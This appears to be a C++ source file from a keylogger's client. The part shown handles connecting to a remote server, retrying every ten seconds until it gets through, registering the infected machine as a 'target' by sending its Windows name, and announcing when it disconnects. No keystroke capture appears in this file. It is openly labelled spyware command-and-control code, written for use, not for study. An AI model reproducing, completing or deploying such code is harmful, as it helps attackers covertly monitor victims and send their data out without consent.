#include "client_keylogger.h"
#include "common.h"
#include "nameTaker.h"
#include <chrono>
#include <thread>

client_keylogger::client_keylogger(uint64_t (*scrambleFunc)(uint64_t))
    : kq::client_interface<messageType>(scrambleFunc) {
    connectInnit();
}

client_keylogger::~client_keylogger() {
    kq::message<messageType> msg(messageType::targetDisconnected);
    Send(msg);
    Disconnect();
}

bool client_keylogger::connectToServer() {
    std::cout << "Establishing connection!\n";

    if (!Connect(server_ip, server_port)) {
        return false;
    }

    return true;
}

void client_keylogger::connectInnit() {
    std::cout << "connectInnit()!\n";

    while (true) {
        if (!connectToServer()) {
            std::cout << "ERROR: No connection could be made. Retrying in 10 "
                         "seconds...\n";
            std::this_thread::sleep_for(std::chrono::seconds(10));
        } else {
            std::cout << "Connected to the server successfully!\n";
            break;
        }
    }
    while (IsConnected() == false) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    kq::message<messageType> msg(messageType::targetConnected);
    std::string name = windowsName();
    for (auto c : name) {
        msg << char(c);
    }
    msg << uint32_t(name.size());
    std::cout << "Sending name: " << name << "\n";
    Send(msg);
}
